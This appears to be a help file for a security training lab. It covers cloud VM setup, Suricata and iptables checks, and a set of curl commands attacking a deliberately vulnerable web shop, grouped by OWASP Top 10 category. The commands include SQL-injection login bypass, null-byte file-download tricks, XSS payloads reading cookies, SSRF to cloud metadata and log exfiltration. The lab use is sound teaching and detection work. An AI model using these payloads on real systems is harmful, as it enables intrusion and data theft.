# Help

## Yandex Cloud

### Create VM
```bash
yc compute instance create \
  --name warfare-vm \
  --public-ip \
  --zone ru-central1-a \
  --hostname warfare-vm \
  --cores 2 \
  --memory 2GB \
  --create-boot-disk image-id=fd84n8eontaojc77hp0u,size=40GB,image-folder-id=standard-images \
  --ssh-key ~/.ssh/id_rsa.pub \
  --core-fraction 50
```

## General

### Resize vagrant disk
```bash
df -h
lsblk
sudo pvresize /dev/sda3
sudo lvextend -l +100%FREE /dev/mapper/ubuntu--vg-ubuntu--lv
sudo resize2fs /dev/mapper/ubuntu--vg-ubuntu--lv
sudo cfdisk /dev/sda
```

### Check iptables:
```bash
sudo iptables -L DOCKER-USER -nv --line-numbers
```

### Check Suricata logs:
```bash
journalctl -u suricata.service -b
sudo tail -n 200 /var/log/suricata/suricata.log
sudo tail -n 0 -f /var/log/suricata/fast.log
sudo tail -n 0 -f /var/log/suricata/eve.json | jq .
```

### Run Suricata:
```bash
sudo suricata -c /etc/suricata/suricata.yaml -q 0
```

## Vulnerabilities

### A01:2021 Broken Access Control

```bash
curl -s -X POST victim:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"' OR 1=1 --\",\"password\":\"any\"}" | jq -r '.authentication.token'

export TOKEN=...

curl -X GET victim:3000/rest/basket/1 \
     -H "Authorization: Bearer $TOKEN" | jq
```

### A02:2021 Cryptographic Failures

```bash
curl -X GET victim:3000/ftp/package.json.bak # won't work
curl -X GET "victim:3000/ftp/package.json.bak%2500.md" \
     -o package.json.bak
curl -X GET "victim:3000/ftp/package.json.bak%2500.pdf" \
     -o package.json.bak
```

### A03:2021 Injection

```bash
curl -X POST victim:3000/rest/user/login \
     -H "Content-Type: application/json" \
     -d "{\"email\":\"' OR 1=1 --\",\"password\":\"any\"}"
```

### A04:2021 Insecure Design

```bash
cd /opt
source venv/bin/activate
python3 brute_login.py
```

### A05:2021 Security Misconfiguration

```bash
curl victim:3000/ftp/legal.md%2500.md
curl victim:3000/ftp/
curl victim:3000/metrics
curl victim:3000/api/SecurityQuestions | jq
curl victim:3000/score-board
```

### A06:2021 Vulnerable Components

```bash
curl victim:3000/ftp/nonexistent.txt
```

### A07:2021 Authentication Failures

```bash
curl -X POST victim:3000/rest/user/login \
     -H "Content-Type: application/json" \
     -d "{\"email\":\"' OR 1=1 --\",\"password\":\"any\"}"
# or
python3 brute_login.py
```

### A08:2021 Software and Data Integrity Failures

```bash
curl "victim:3000/#/search?q=<script>alert(1)</script>"
curl -G "http://172.20.0.106:3000/#/search" \
     --data-urlencode "q=<iframe src='javascript:alert(1)'>"
curl "victim:3000/#/track-result?id=<img%20src=x%20onerror=alert(1)>"
curl "victim:3000/#/search?q=javascript:alert(document.cookie)"
```

### A09:2021 Security Logging and Monitoring Failures

```bash
curl victim:3000/support/logs
curl "victim:3000/support/logs/access.log.2025-10-17" -o access.log
cat access.log

curl "http://172.20.0.106:3000/support/logs/audit.json" -o audit.json
cat audit.json | jq
```

### A10:2021 Server-Side Request Forgery - SSRF

```bash
curl -X POST victim:3000/profile/image/url \
     -H "Content-Type: application/json" \
     -d '{"imageUrl":"http://1.2.3.4/latest/meta-data"}'

curl -X POST victim:3000/profile/image/url \
     -H "Content-Type: application/json" \
     -d '{"imageUrl":"http://localhost:3000/rest/admin/application-configuration"}'
```